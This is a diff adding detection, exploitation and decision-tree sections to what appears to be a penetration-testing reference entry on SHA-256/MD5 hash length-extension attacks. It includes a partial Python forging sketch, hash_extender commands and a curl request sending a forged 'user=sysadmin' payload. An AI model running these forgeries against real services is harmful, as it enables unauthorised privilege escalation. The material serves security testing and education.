@@ -39,15 +39,53 @@ owaspRefs: ["OWASP Top 10 A02:2021 Cryptographic Failures"]
 
 ### Detection
 
+```bash
+# Signature is a raw digest (32/40/64 hex chars) appended to or beside a parameter
+# and the format looks like:  ?data=<user=admin>&sig=8f14e45fceea167a5a36dedd4bea2543
+# Test: change any byte of `data` -> signature invalid; but the sig length matches MD5(32)/SHA1(40)/SHA256(64)
+echo -n "user=admin" | md5sum    # compare candidate digests with the observed sig
+```
 
 ### Exploitation
 
+```python
+#!/usr/bin/env python3
+# Length-extension for SHA256: forge hash(secret || msg || glue || extension) without the secret
+import struct
+
+def sha_pad(msg_len: int) -> bytes:
+    pad = b'\x80' + b'\x00' * ((55 - msg_len) % 64)
+    return pad + struct.pack('>Q', (msg_len * 8) & 0xFFFFFFFFFFFFFFFF)
+
+# known: original message "user=admin", unknown secret length guess = 16
+msg = b"user=admin"
+ext = b"&user=sysadmin"
+glue = sha_pad(len(msg) + SECRET_LEN_GUESS)   # try each plausible secret length
+forged_payload = msg + glue + ext             # send as new data param
+# recompute signature using the ORIGINAL digest as the chaining state:
+# state := unhexlify(orig_sig); run SHA-256 compression over ext + final padding
+```
+
+```bash
+# Or use the standard tool — hash_extender handles MD5/SHA1/SHA256 variants:
+git clone https://github.com/iagox86/hash_extender && cd hash_extender && make
+./hash_extender --data 'user=admin' --signature 8f14e45f... \
+  --format sha256 --secret-length 16 --append '&user=sysadmin'
+```
 
 ### Tool Command
 
+```bash
+# Verify a forged request end-to-end once the tool emits payload+signature:
+curl -s "https://target.com/api?data=user%3Dadmin%80%00...%26user%3Dsysadmin&sig=<forged_sig>"
+```
 
 ### Decision Tree
 
+1. Sig = plain digest (not base64 JWT/HMAC envelope)? → candidate.
+2. Change one data byte → does ONLY the sig check fail? → candidate.
+3. Run hash_extender across secret lengths 1–64 until server accepts → CONFIRMED.
+4. Server rejects all lengths / uses keyed HMAC library → not vulnerable.
 
 ---
 
